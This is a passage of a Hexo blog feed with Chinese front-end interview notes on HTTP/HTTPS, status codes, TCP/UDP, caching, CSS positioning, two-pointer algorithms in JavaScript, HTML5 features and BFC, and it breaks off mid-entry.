    <content type="html"><![CDATA[<h1 id="网络知识点总结"><a href="#网络知识点总结" class="headerlink" title="网络知识点总结"></a>网络知识点总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整理一下常见的网络面试题</p><h3 id="HTTP与HTTPS区别"><a href="#HTTP与HTTPS区别" class="headerlink" title="HTTP与HTTPS区别"></a>HTTP与HTTPS区别</h3><p>HTTP：超文本传输协议，是一种用于分布式、协作式和超媒体信息系统的应用层协议。 简单来说就是一种发布和接收 HTML 页面的方法，被用于在 Web 浏览器和网站服务器之间传递信息</p><p>–  HTTP协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息，因此，HTTP协议不适合传输一些敏感信息，比如：信用卡号、密码等支付信息</p><p>HTTPS：超文本传输安全协议，是一种透过计算机网络进行安全通信的传输协议。HTTPS 经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包。HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。</p><p>– 它的工作流程一般如以下方式：<br>1、TCP 三次同步握手<br>2、客户端验证服务器数字证书<br>3、DH 算法协商对称加密算法的密钥、hash 算法的密钥<br>4、SSL 安全加密隧道协商完成<br>5、网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的hash算法进行数据完整性保护，保证数据不被篡改。</p><p>HTTP 明文传输，数据都是未加密的，安全性较差，HTTPS 数据传输过程是加密的，安全性较好。<br>使用 HTTPS 协议需要到申请证书，一般需要一定费用。<br>HTTP 页面响应速度比 HTTPS 快，主要是因为 HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包，而 HTTPS除了 TCP 的三个包，还要加上 ssl 握手需要的 9 个包，所以一共是 12 个包。<br>http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。<br>HTTPS 其实就是建构在 SSL/TLS 之上的 HTTP 协议，所以，要比较 HTTPS 比 HTTP 要更耗费服务器资源。</p><h3 id="从输入URL到页面加载发生了什么总体来说分为以下几个过程"><a href="#从输入URL到页面加载发生了什么总体来说分为以下几个过程" class="headerlink" title="从输入URL到页面加载发生了什么总体来说分为以下几个过程:"></a>从输入URL到页面加载发生了什么总体来说分为以下几个过程:</h3><ol><li>DNS解析</li></ol><p>DNS解析的过程就是寻找哪台机器上有你需要资源的过程。 先进行DNS域名解析，先查看本地hosts文件，查看有没有当前域名对应的ip地址，若有直接发起请求，没有的话会在本地域名服务器去查找，该查找属于递归查找，如果本地域名服务器没查找到，会从根域名服务器查找，该过程属于迭代查找，根域名会告诉你从哪个与服务器查找，最后查找到对应的ip地址后把对应规则保存到本地的hosts文件中。<br>这里顺便提一下DNS优化方案：<br>（1）DNS缓存（DNS存在着多级缓存，从离浏览器的距离排序的话，有以下几种: 浏览器缓存，系统缓存，路由器缓存，IPS服务器缓存，根域名服务器缓存，顶级域名服务器缓存，主域名服务器缓存。）<br>（2）DNS负载均衡（DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡，又叫做DNS重定向。CDN(Content Delivery Network)就是利用DNS的重定向技术，DNS服务器会返回一个跟用户最接近的点的IP地址给用户，CDN节点的服务器负责响应用户的请求，提供所需的内容。）</p><ol start="2"><li><p>TCP连接<br>进行http请求，三次握手四次挥手建立断开连接。<br>这里要提醒一点，Chrome 在同一个域名下要求同时最多只能有 6 个 TCP 连接，超过 6 个的话剩下的请求就得等待。</p></li><li><p>发送HTTP请求<br>TCP连接建立完毕后，浏览器可以和服务器开始通信，发送HTTP请求的过程就是构建HTTP请求报文并通过TCP协议中发送到服务器指定端口(HTTP协议80/8080, HTTPS协议443)。<br>HTTP请求报文是由三部分组成:<br>请求行：</p></li></ol><p>// 请求方法是GET，路径为根路径，HTTP协议版本为1.1<br>GET / HTTP/1.1</p><p>常用的方法有: GET, POST, PUT, DELETE, OPTIONS, HEAD。<br>请求头：请求报头允许客户端向服务器传递请求的附加信息和客户端自身的信息。<br>请求报头中常见的字段：</p><p>Accept用于指定客户端用于接受哪些类型的信息<br>Accept-Encoding与Accept类似，它用于指定接受的编码方式。<br>Connection设置为Keep-alive用于告诉客户端本次HTTP请求结束之后并不需要关闭TCP连接，这样可以使下次HTTP请求使用相同的TCP通道，节省TCP连接建立的时间。<br>请求体： 当使用POST, PUT等方法时，通常需要客户端向服务器传递数据。这些数据就储存在请求正文中。在请求头中有一些与请求正文相关的信息</p><ol start="4"><li>服务器处理请求并返回HTTP报文<br>HTTP 请求到达服务器，服务器进行对应的处理。最后要把数据传给浏览器，也就是返回网络响应。<br>HTTP响应报文也是由三部分组成:<br>状态码（下文有详细介绍）<br>响应头<br>响应头包含了服务器及其返回数据的一些信息, 服务器生成数据的时间、返回的数据类型以及对即将写入的Cookie信息。<br>常见的响应报头字段有: Server, Connection…。<br>响应体<br>服务器返回给浏览器的文本信息，通常HTML, CSS, JS, 图片等文件就放在这一部分。</li><li>浏览器解析渲染页面<br>浏览器是一个边解析边渲染的过程。首先浏览器解析HTML文件构建DOM树，然后解析CSS文件构建渲染树，等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上。这个过程比较复杂，涉及到两个概念: reflow(回流)和repain(重绘)。DOM节点中的各个元素都是以盒模型的形式存在，这些都需要浏览器去计算其位置和大小等，这个过程称为relow;<strong>当盒模型的位置,大小以及其他属性，如颜色,字体,等确定下来之后，浏览器便开始绘制内容，这个过程称为repain。</strong>页面在首次加载时必然会经历reflow和repain。reflow和repain过程是非常消耗性能的，尤其是在移动设备上，它会破坏用户体验，有时会造成页面卡顿。所以我们应该尽可能少的减少reflow和repain。</li><li>连接结束</li></ol><h3 id="HTTP响应状态码"><a href="#HTTP响应状态码" class="headerlink" title="HTTP响应状态码"></a>HTTP响应状态码</h3><p>信息响应(100–199)——表示请求已被接受，但需要后续处理。例如：</p><p>100（Continue）客户端应继续发送请求。<br>101（Switching Protocols）需要切换协议，服务器通过的Upgrade响应头字段通知客户端。<br>成功响应(200–299)——表示请求已成功被服务器接收、理解、并接受。</p><p>200 请求已成功，请求所希望的响应头或数据体将随此响应返回。<br>201（Created）请求已经被实现，而且有一个新的资源已经依据请求的需要而创建。在RESTFul风格的URL设计中，通常用来响应POST请求。<br><strong>202（Accepted）服务器已接受请求，但尚未处理。</strong>比如POST一个资源应当返回201，但由于性能原因未能立即创建，可以返回202。<br>204（No Content）服务器成功处理了请求，但不需要返回任何实体内容，204响应禁止包含任何消息体。浏览器收到该响应后不应产生文档视图的变化。<br>205（Reset Content）服务器成功处理了请求，但不需要返回任何实体内容，205响应禁止包含任何消息体。 与204不同的是，返回此状态码的响应要求请求者重置文档视图。比如用户刚刚提交一个表单，返回205后页面重置，用户可以立即填写下一个表单。<br>206（Partial Content）HTTP协议允许分片传输。请求头中包含Range字段时，响应需要只返回Range指定的那一段。响应中应包含Content-Range来指示返回内容的范围。<br>重定向(300–399)——这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，重定向目标在本次响应的Location头字段中指明。</p><p>301（Moved Permanently）被请求的资源已永久移动到新位置，也就是永久重定向。<br>应用场景：域名更改，访问原始域名重定向到新的域名<br>302（Found）请求的资源现在临时从不同的URI响应请求。也就是临时重定向，<br>303（See Other）对应当前请求的响应可以在另一个URI上被找到，而且客户端应当采用GET的方式访问那个资源。 这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。 303响应禁止被缓存。<br>303会使得浏览器直接GET那个资源，不需用户同意。这是Web应用中最常见的重定向方式。<br>304（Not Modified）表示可以在缓存中取数据（协商缓存）<br>304响应也是一种缓存机制。Web服务器对静态资源文件通常会采取缓存，因此在Web开发中你可以看到大量的304响应。 服务器给出的相应中通常会包含Etag来标识资源ID<br>客户端错误(400–499)——这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。 除非响应的是一个HEAD请求，否则服务器就应该返回一个解释当前错误状况的实体。</p><p>400（Bad Request）<br>由于包含语法错误，当前请求无法被服务器理解。400通常在服务器端表单验证失败时返回。<br>401（Unauthorized）无权访问<br>当前请求需要用户验证，响应中会包含一个WWW-Authenticate字段来询问用户的授权信息,输入验证信息并点击确定，浏览器会根据你的输入填写Authorization头并重新发送请求。<br>403（Forbidden）<br>服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助。403和401一样，需要在相应消息体中需要给出原因。除非是一个HEAD请求。<br>404（Not Found）找不到资源<br>这太常见了。就是请求所希望得到的资源未被在服务器上发现。当通常用于当服务器不想揭示到底为何请求被拒绝时，比如应当返回500时服务器不愿透露自己的错误。<br>405（Method Not Allowed）请求行中指定的请求方法不能被用于请求相应的资源。在Web开发中通常是因为客户端和服务器的方法不一致，比如客户端通过PUT来修改一个资源，而服务器把它实现为POST方法。 开发中统一规范就好了。<br>413（Request Entity Too Large）上传的资源大小超过服务器限制的大小<br>一般的服务器都会设置HTTP请求消息体的最大长度，当然这是一种阻挡攻击的手段。 例如你在使用HTTP方式来访问Git仓库，如果你在仓库中加入了大的二进制文件（通常为目标文件或多媒体文件）， 在Push时服务器很可能会返回413错误。如果切换为ssh协议就不会有这样的问题了，服务器只能限制整个仓库的大小。<br>414（Request-URI Too Large）<br>当URI太长时，服务器可以返回414. 当HTTP协议并未规定URI应当有多长。这取决于浏览器和服务器的设置， 在服务器中当然你想设置多长都可以，但是浏览器是你决定不了的，而且不同的厂商在采用不同的长度限制，可以认为最短的是2K：<br>服务器错误 (500–599)<br>这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。 并且响应消息体中应当给出理由，除非是HEAD请求。</p><p>500（Internal Server Error）服务器错误<br>通常是代码出错，后台Bug。一般的Web服务器通常会给出抛出异常的调用堆栈。 然而多数服务器即使在生产环境也会打出调用堆栈，这显然是不安全的。<br>502（Bad Gateway）<br>作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。<br>如果你在用HTTP代理来翻墙，或者你配置了nginx来反向代理你的应用，你可能会常常看到它。<br>503 服务器超负荷<br>504（Gateway Time-out）<br>作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器收到响应。<br>注意与502的区别：502是接收到了无效响应比如Connection Refused； 504是响应超时，通常是被墙了。</p><h3 id="三次握手过程理解"><a href="#三次握手过程理解" class="headerlink" title="三次握手过程理解"></a>三次握手过程理解</h3><h3 id="四次挥手过程理解"><a href="#四次挥手过程理解" class="headerlink" title="四次挥手过程理解"></a>四次挥手过程理解</h3><h3 id="tcp-和udp有什么区别"><a href="#tcp-和udp有什么区别" class="headerlink" title="tcp 和udp有什么区别"></a>tcp 和udp有什么区别</h3><p>1.连接方面</p><p>tcp面向连接，udp不需要连接<br>tcp需要三次握手四次挥手请求连接<br>2.可靠性</p><p>tcp是可靠传输；一旦传输过程中丢包的话会进行重传<br>udp是不可靠传输，但会最大努力交付<br>3.工作效率</p><p>UDP实时性高，比TCP工作效率高<br>因为不需要建立连接，更不需要复杂的握手挥手以及复杂的算法，也没有重传机制<br>4.是否支持多对多</p><p>TCP是点对点的<br>UDP支持一对一，一对多，多对多<br>5.首部大小</p><p>tcp首部占20字节<br>udp首部占8字节</p><h3 id="HTTP-缓存"><a href="#HTTP-缓存" class="headerlink" title="HTTP 缓存"></a>HTTP 缓存</h3><p>HTTP 缓存又分为强缓存和协商缓存：</p><ul><li>首先通过 Cache-Control 验证强缓存是否可用，如果强缓存可用，那么直接读取缓存</li><li>如果不可以，那么进入协商缓存阶段，发起 HTTP 请求，服务器通过请求头中是否带上 If-Modified-Since 和 If-None-Match 这些条件请求字段检查资源是否更新：<ul><li>若资源更新，那么返回资源和 200 状态码</li><li>如果资源未更新，那么告诉浏览器直接使用缓存获取资源</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>面试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>position取值</title>
    <link href="/hexo_blog/2021/09/21/position/"/>
    <url>/hexo_blog/2021/09/21/position/</url>
    
    <content type="html"><![CDATA[<h1 id="position取值-call-me-hand"><a href="#position取值-call-me-hand" class="headerlink" title="position取值:call_me_hand:"></a>position取值:call_me_hand:</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CSS position属性用于指定一个元素在文档中的定位方式。top，right，bottom 和 left 属性则决定了该元素的最终位置。</p><h2 id="position5个取值"><a href="#position5个取值" class="headerlink" title="position5个取值"></a>position5个取值</h2><h3 id="static-相对定位"><a href="#static-相对定位" class="headerlink" title="static  相对定位"></a>static  相对定位</h3><blockquote><p>默认值，没有定位，元素出现在正常文档流中（忽略 <code>top, bottom, left, right</code> 或者 <code>z-index</code> 声明）</p></blockquote><h3 id="relative"><a href="#relative" class="headerlink" title="relative"></a>relative</h3><blockquote><p>相对定位，不脱离文档流，相对于元素原本在文档流中的位置进行定位（ <code>left、right、top、bottom</code> 起作用）</p></blockquote><h3 id="absolute-绝对定位"><a href="#absolute-绝对定位" class="headerlink" title="absolute  绝对定位"></a>absolute  绝对定位</h3><blockquote><p>绝对定位，脱离文档流，相对于元素最近的，已定位的父级元素进行定位（不能是 static）；<br>如果不存在这样的父级元素，就相对于 body 元素进行定位；<br>可以使用 left、right、top、bottom 来确定元素的位置；<br>会隐性的改变 display 的值为 inline-block；</p></blockquote><h3 id="fixed-固定定位"><a href="#fixed-固定定位" class="headerlink" title="fixed 固定定位"></a>fixed 固定定位</h3><blockquote><p>固定定位，脱离文档流；<br>相对于浏览器窗口进行定位，不随滚动条的移动而改变位置；<br>可以使用 left、right、top、bottom 来确定元素的位置；</p></blockquote><h3 id="sticky-粘性定位"><a href="#sticky-粘性定位" class="headerlink" title="sticky 粘性定位"></a>sticky 粘性定位</h3><blockquote><p>元素根据正常文档流进行定位，然后相对它的最近滚动祖先（nearest scrolling ancestor）和 containing block (最近块级祖先 nearest block-level ancestor)，包括table-related元素，基于top, right, bottom, 和 left的值进行偏移。偏移值不会影响任何其他元素的位置。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>css</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法 - 双指针</title>
    <link href="/hexo_blog/2021/09/20/%E7%AE%97%E6%B3%95-%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    <url>/hexo_blog/2021/09/20/%E7%AE%97%E6%B3%95-%E5%8F%8C%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[<h1 id="双指针相关算法"><a href="#双指针相关算法" class="headerlink" title="双指针相关算法"></a>双指针相关算法</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    妙用双指针，会在许多的数组相关解法中有意想不到的收获，无论是算法复杂度和解题思路，都有很大的提升</p><p><img src="C:/Users/l%27x/Pictures/%E4%B8%8B%E8%BD%BD.jpeg"></p><h5 id="输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分"><a href="#输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分" class="headerlink" title="输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分"></a>输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分</h5><p>思路：</p><blockquote><p>设定两个指针</p><p>第一个指针start从数组第一个元素出发，向尾部前进</p><p>第二个指针end从数组的最后一个元素出发，向头部前进</p><p>start遍历到偶数，end遍历到奇数时，交换两个数的位置</p><p>当start&gt;end时，完成交换</p></blockquote><p>代码：</p><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> reOrderArray(<span class="hljs-keyword">array</span>) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">Array</span>.isArray(<span class="hljs-keyword">array</span>)) &#123;      let start = <span class="hljs-number">0</span>;      let end = <span class="hljs-keyword">array</span>.length - <span class="hljs-number">1</span>;      <span class="hljs-keyword">while</span> (<span class="hljs-keyword">start</span> &lt; <span class="hljs-keyword">end</span>) &#123;        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">array</span>[<span class="hljs-keyword">start</span>] % <span class="hljs-number">2</span> === <span class="hljs-number">1</span>) &#123;          <span class="hljs-keyword">start</span>++;        &#125;        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">array</span>[<span class="hljs-keyword">end</span>] % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) &#123;          <span class="hljs-keyword">end</span><span class="hljs-comment">--;</span>        &#125;        // 判断是否交换位置        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">start</span> &lt; <span class="hljs-keyword">end</span>) &#123;          [<span class="hljs-keyword">array</span>[<span class="hljs-keyword">start</span>], <span class="hljs-keyword">array</span>[<span class="hljs-keyword">end</span>]] = [<span class="hljs-keyword">array</span>[<span class="hljs-keyword">end</span>], <span class="hljs-keyword">array</span>[<span class="hljs-keyword">start</span>]]        &#125;      &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>;  &#125;</code></pre></div><h5 id="输入一个递增排序的数组和一个数字S，在数组中查找两个数，使得他们的和正好是S，如果有多对数字的和等于S，输出两个数的乘积最小的。"><a href="#输入一个递增排序的数组和一个数字S，在数组中查找两个数，使得他们的和正好是S，如果有多对数字的和等于S，输出两个数的乘积最小的。" class="headerlink" title="输入一个递增排序的数组和一个数字S，在数组中查找两个数，使得他们的和正好是S，如果有多对数字的和等于S，输出两个数的乘积最小的。"></a>输入一个递增排序的数组和一个数字<code>S</code>，在数组中查找两个数，使得他们的和正好是<code>S</code>，如果有多对数字的和等于<code>S</code>，输出两个数的乘积最小的。</h5><p>思路；</p><blockquote><p>数组中可能有多对符合条件的结果，而且要求输出乘积最小的，说明要分布在两侧 比如 <code>3,8</code> <code>5,7</code> 要取<code>3,8</code>。</p></blockquote><p>看了题目了，很像<code>leetcode</code>的第一题【两数之和】，但是题目中有一个明显不同的条件就是数组是有序的，可以使用使用大小指针求解，不断逼近结果，最后取得最终值。</p><ul><li>设定一个小索引<code>left</code>，从<code>0</code>开始</li><li>设定一个大索引<code>right</code>，从<code>array.length</code>开始</li><li>判断<code>array[left] + array[right]</code>的值<code>s</code>是否符合条件</li><li>符合条件 - 返回</li><li>大于<code>sum</code>，<code>right</code>向左移动</li><li>小于<code>sum</code>，<code>left</code>向右移动</li><li>若<code>left=right</code>，没有符合条件的结果</li></ul><blockquote><p>类似【两数之和】的解法来求解，使用<code>map</code>存储另已经遍历过的<code>key</code>，这种解法在有多个结果的情况下是有问题的，因为这样优先取得的结果是乘积较大的。例如 <code>3,8</code> <code>5,7</code> ，会优先取到<code>5,7</code>。</p></blockquote><p>代码：</p><div class="hljs code-wrapper"><pre><code class="hljs vbscript"><span class="hljs-keyword">function</span> FindNumbersWithSum(<span class="hljs-built_in">array</span>, sum) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">array</span> &amp;&amp; <span class="hljs-built_in">array</span>.length &gt; <span class="hljs-number">0</span>) &#123;      <span class="hljs-keyword">let</span> <span class="hljs-built_in">left</span> = <span class="hljs-number">0</span>;      <span class="hljs-keyword">let</span> <span class="hljs-built_in">right</span> = <span class="hljs-built_in">array</span>.length - <span class="hljs-number">1</span>;      <span class="hljs-keyword">while</span> (<span class="hljs-built_in">left</span> &lt; <span class="hljs-built_in">right</span>) &#123;        <span class="hljs-keyword">const</span> s = <span class="hljs-built_in">array</span>[<span class="hljs-built_in">left</span>] + <span class="hljs-built_in">array</span>[<span class="hljs-built_in">right</span>];        <span class="hljs-keyword">if</span> (s &gt; sum) &#123;          <span class="hljs-built_in">right</span>--;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s &lt; sum) &#123;          <span class="hljs-built_in">left</span>++;        &#125; <span class="hljs-keyword">else</span> &#123;          return [<span class="hljs-built_in">array</span>[<span class="hljs-built_in">left</span>], <span class="hljs-built_in">array</span>[<span class="hljs-built_in">right</span>]]        &#125;      &#125;    &#125;    return [];  &#125;</code></pre></div><h5 id="输入一个正数S，打印出所有和为S的连续正数序列。例如：输入15，有序1-2-3-4-5-4-5-6-7-8-15-所以打印出3个连续序列1-5，5-6和7-8。"><a href="#输入一个正数S，打印出所有和为S的连续正数序列。例如：输入15，有序1-2-3-4-5-4-5-6-7-8-15-所以打印出3个连续序列1-5，5-6和7-8。" class="headerlink" title="输入一个正数S，打印出所有和为S的连续正数序列。例如：输入15，有序1+2+3+4+5 = 4+5+6 = 7+8 = 15 所以打印出3个连续序列1-5，5-6和7-8。"></a>输入一个正数<code>S</code>，打印出所有和为S的连续正数序列。例如：输入<code>15</code>，有序<code>1+2+3+4+5</code> = <code>4+5+6</code> = <code>7+8</code> = <code>15</code> 所以打印出3个连续序列<code>1-5</code>，<code>5-6</code>和<code>7-8</code>。</h5><p>思路：</p><blockquote><p>创建一个容器child，用于表示当前的子序列，初始元素为1,2</p><p>记录子序列的开头元素small和末尾元素big</p><p>big向右移动子序列末尾增加一个数 small向右移动子序列开头减少一个数</p><p>当子序列的和大于目标值，small向右移动，子序列的和小于目标值，big向右移动</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs maxima">function FindContinuousSequence(<span class="hljs-built_in">sum</span>) &#123;     const result = [];     const child = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>];     <span class="hljs-built_in">let</span> big = <span class="hljs-number">2</span>;     <span class="hljs-built_in">let</span> small = <span class="hljs-number">1</span>;     <span class="hljs-built_in">let</span> currentSum = <span class="hljs-number">3</span>;     // 较大的数不能超过所求的数     <span class="hljs-keyword">while</span> (big &lt; <span class="hljs-built_in">sum</span>) &#123;     // 整体和小于所求的数，则忘容器李加数据       <span class="hljs-keyword">while</span> (currentSum &lt; <span class="hljs-built_in">sum</span> &amp;&amp; big &lt; <span class="hljs-built_in">sum</span>) &#123;         child.<span class="hljs-built_in">push</span>(++big);         currentSum += big;       &#125;       // 如果加了数之后发现总数大了，就移除容器前面的数       <span class="hljs-keyword">while</span> (currentSum &gt; <span class="hljs-built_in">sum</span> &amp;&amp; small &lt; big) &#123;         child.shift();         currentSum -= small++;       &#125;       // 如果总数等于所求的数，则将这种可能加入返回的数组中       <span class="hljs-keyword">if</span> (currentSum === <span class="hljs-built_in">sum</span> &amp;&amp; child.<span class="hljs-built_in">length</span> &gt; <span class="hljs-number">1</span>) &#123;         result.<span class="hljs-built_in">push</span>(child.slice());         child.<span class="hljs-built_in">push</span>(++big);         currentSum += big;       &#125;     &#125;     <span class="hljs-built_in">return</span> result;   &#125;</code></pre></div><p>总结</p><blockquote><p>双指针可以使用在数组链表等这样的数据结构中，在遍历过程中我们可以使用多个标记点来遍历数组等，或是一个在头一个在尾，获取都在一方，一个快一个慢。这样就能更灵活的操作数据</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>H5新特性</title>
    <link href="/hexo_blog/2021/09/17/HTML5%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    <url>/hexo_blog/2021/09/17/HTML5%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="H5新特性"><a href="#H5新特性" class="headerlink" title="H5新特性"></a>H5新特性</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>html5总的来说比html4多了十个新特性，但其不支持ie8及ie8以下版本的浏览器<br>一、语义标签</p><p>二、增强型表单</p><p>三、视频和音频</p><p>四、Canvas绘图</p><p>五、SVG绘图</p><p>六、地理定位</p><p>七、拖放API</p><p>八、WebWorker</p><p>九、WebStorage</p><p>十、WebSocket</p><h2 id="新特性"><a href="#新特性" class="headerlink" title="新特性"></a>新特性</h2><ul><li>画布(<code>Canvas</code>) API</li><li>地理(<code>Geolocation</code>) API</li><li>音频、视频API(<code>audio</code>,<code>video</code>)</li><li><code>localStorage</code>和<code>sessionStorage</code></li><li><code>webworker</code>, <code>websocket</code></li><li>新的一套标签 <code>header</code>,<code>nav</code>,<code>footer</code>,<code>aside</code>,<code>article</code>,<code>section</code></li><li><code>web worker</code>是运行在浏览器后台的js程序，他不影响主程序的运行，是另开的一个js线程，可以用这个线程执行复杂的数据操作，然后把操作结果通过postMessage传递给主线程，这样在进行复杂且耗时的操作时就不会阻塞主线程了。</li><li><code>HTML5 History</code>两个新增的API：<code>history.pushState</code> 和 <code>history.replaceState</code>，两个 API 都会操作浏览器的历史记录，而不会引起页面的刷新。</li></ul><blockquote><p><code>Hash</code>就是<code>url</code> 中看到 <code>#</code> ,我们需要一个根据监听哈希变化触发的事件( <code>hashchange</code>) 事件。我们用 <code>window.location</code>处理哈希的改变时不会重新渲染页面，而是当作新页面加到历史记录中，这样我们跳转页面就可以在 hashchange 事件中注册 ajax 从而改变页面内容。 可以为hash的改变添加监听事件：</p></blockquote><ul><li><code>WebSocket</code> 使用<code>ws</code>或<code>wss</code>协议，<code>Websocket</code>是一个持久化的协议，相对于HTTP这种非持久的协议来说。WebSocket API最伟大之处在于服务器和客户端可以在给定的时间范围内的任意时刻，相互推送信息。<code>WebSocket</code>并不限于以Ajax(或XHR)方式通信，因为Ajax技术需要客户端发起请求，而WebSocket服务器和客户端可以彼此相互推送信息；XHR受到域的限制，而<code>WebSocket</code>允许跨域通信</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h5 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h5><p>结构元素：article、aside、header、hgroup、footer、figure、section、nav<br>其他元素：video、audio、canvas、embed、mark、progress、meter、time、command、details、datagrid、keygen、output、source、menu、ruby、wbr、bdi、dialog、</p><h5 id="废除"><a href="#废除" class="headerlink" title="废除"></a>废除</h5><p>纯表现元素：basefont、big、center、font、s、strike、tt、u 用css代替<br>部分浏览器支持的元素：applet、bgsound、blink、marquee<br>对可用性产生负面影响的元素：frameset、frame、noframes,在html5中不支持frame框架，只支持iframe框架</p>]]></content>
    
    
    <categories>
      
      <category>html</category>
      
    </categories>
    
    
    <tags>
      
      <tag>html</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BFC🚓</title>
    <link href="/hexo_blog/2021/09/14/BFC/"/>
    <url>/hexo_blog/2021/09/14/BFC/</url>
    
    <content type="html"><![CDATA[<h1 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h1><p><code>常见的定位方案，定位方案是控制元素的布局，有三种常见方案:</code></p><ul><li>普通流 (normal flow)</li></ul><blockquote><p>在普通流中，元素按照其在 HTML 中的先后位置至上而下布局，在这个过程中，行内元素水平排列，直到当行被占满然后换行，块级元素则会被渲染为完整的一个新行，除非另外指定，否则所有元素默认都是普通流定位，也可以说，普通流中元素的位置由该元素在 HTML 文档中的位置决定。</p></blockquote><ul><li>浮动 (float)</li></ul><blockquote><p>在浮动布局中，元素首先按照普通流的位置出现，然后根据浮动的方向尽可能的向左边或右边偏移，其效果与印刷排版中的文本环绕相似。</p></blockquote><ul><li>绝对定位 (absolute positioning)</li></ul><blockquote><p>在绝对定位布局中，元素会整体脱离普通流，因此绝对定位元素不会对其兄弟元素造成影响，而元素具体的位置由绝对定位的坐标决定。</p></blockquote><p><strong>Formatting context(格式化上下文) 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。</strong></p><p>那么 BFC 是什么呢？</p><p>BFC 即 Block Formatting Contexts (块级格式化上下文)，它属于上述定位方案的普通流。</p><p>具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。</p><p>通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。</p><h4 id="触发-BFC"><a href="#触发-BFC" class="headerlink" title="触发 BFC"></a>触发 BFC</h4><p>只要元素满足下面任一条件即可触发 BFC 特性：</p><ul><li>body 根元素</li><li>浮动元素：float 除 none 以外的值</li><li>绝对定位元素：position (absolute、fixed)</li><li>display 为 inline-block、table-cells、flex</li><li>overflow 除了 visible 以外的值 (hidden、auto、scroll)</li></ul><h4 id="BFC-特性及应用"><a href="#BFC-特性及应用" class="headerlink" title="BFC 特性及应用"></a>BFC 特性及应用</h4><p><strong>1. 同一个 BFC 下外边距会发生折叠</strong></p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>div&#123;    width: 100px;    height: 100px;    background: lightblue;    margin: 100px;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre></div><p><img src="https://pic4.zhimg.com/80/v2-0a9ca8952c83141250a2d9002e6d2047_720w.png" alt="img"></p><p>从效果上看，因为两个 div 元素都处于同一个 BFC 容器下 (这里指 body 元素) 所以第一个 div 